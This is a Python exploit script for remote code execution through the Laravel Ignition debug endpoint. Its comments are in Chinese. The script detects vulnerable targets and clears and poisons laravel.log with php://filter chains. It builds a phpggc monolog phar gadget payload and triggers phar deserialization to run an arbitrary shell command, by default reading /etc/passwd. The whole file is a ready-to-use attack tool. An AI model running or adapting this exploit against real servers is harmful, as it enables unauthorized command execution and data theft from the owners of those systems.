#!/usr/bin/python3

import requests as req
import re, os


def exp(target, command):
    gadgetchain = {
        "rce1_tpl": r""" php -d 'phar.readonly=0' phpggc/phpggc monolog/rce1 system %s --phar phar -o php://output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())" > payload.txt"""
    }  # phpggc链集合，暂时添加rce1后续再添加其他增强通杀能力

    header = {
        "Accept": "application/json"
    }

    data = {
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {
            "variableName": "sssssnckersssss",
            "viewFile": ""
        }
    }
    url = req.compat.urljoin(target, "_ignition/execute-solution")  # 构造url
    resp1 = req.get(url, verify=False)
    if resp1.status_code != 405:
        print("[-][%s] is not vulnerable." % (target))
        return None

    rootDir = re.search(r'/.+vendor/laravel', resp1.text).group()[:-len("vendor/laravel")]  # 取根目录绝对路径，这方法可能不是很好。
    # print(rootDir)

    # 1.清空日志
    data["parameters"][
        "viewFile"] = "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
    req.post(url, json=data, headers=header, verify=False)
    req.post(url, json=data, headers=header, verify=False)  # 有时候第一次依然重复报错，再来一次就好了。

    # 2.生成payload
    command = command.replace(' ', r'\ ')  # 处理一下命令字符串
    os.system(gadgetchain["rce1_tpl"] % (command))
    with open('payload.txt', 'r') as f:
        payload = f.read().replace('\n', '') + 'a'  # 添加一个字符使得两个完整的payload总是只有一个可以正常解码
    os.system("rm payload.txt")
    # print(payload)

    # 3.写log文件
    padding = 16  # or 15 打不通再修改
    data["parameters"]["viewFile"] = 'a' * padding  # 控制log文件字节数使其为双数（因为要utf16->utf8，若为单数会转换报错影响日志文件）
    resp3 = req.post(url, json=data, headers=header, verify=False)
    data["parameters"]["viewFile"] = payload
    resp4 = req.post(url, json=data, headers=header, verify=False)
    # print(resp3.text)
    # print(resp4.text)

    # 4.解码log文件
    data["parameters"][
        "viewFile"] = "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
    resp5 = req.post(url, json=data, headers=header, verify=False)
    # print(resp5.text)

    # 5. phar反序列化执行
    data["parameters"]["viewFile"] = "phar://%sstorage/logs/laravel.log/test.txt" % (rootDir)
    resp6 = req.post(url, json=data, headers=header, verify=False)
    exec_res = resp6.text[:resp6.text.find("{\n")]
    print(exec_res)
    return exec_res


def main():
    exp("http://127.0.0.1:8888", "cat /etc/passwd")


if __name__ == '__main__':
    main()
